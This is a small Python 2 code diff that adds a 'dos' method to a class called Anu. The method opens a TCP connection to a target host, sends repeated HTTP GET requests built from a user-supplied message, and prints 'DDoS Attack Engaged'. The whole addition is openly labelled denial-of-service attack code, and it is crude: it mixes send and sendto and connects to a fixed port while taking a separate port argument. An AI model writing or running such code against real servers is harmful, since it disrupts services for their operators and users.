@@ -33,4 +33,15 @@ class Anu(object):
 		else:
 			return False
 		s.close()
-			
+	def dos(self,host,port,message):
+		ip = gethostbyname( host )
+		ddos = socket(AF_INET, SOCK_STREAM)
+		try:
+			ddos.connect((host, 80))
+			ddos.send( "GET /%s HTTP/1.1\r\n" % message )
+			ddos.sendto( "GET /%s HTTP/1.1\r\n" % message, (ip, port) )
+			ddos.send( "GET /%s HTTP/1.1\r\n" % message )
+		except socket.error, msg:
+			print("|[Connection Failed]         |")
+		print ( "|[DDoS Attack Engaged]       |")
+		ddos.close()		
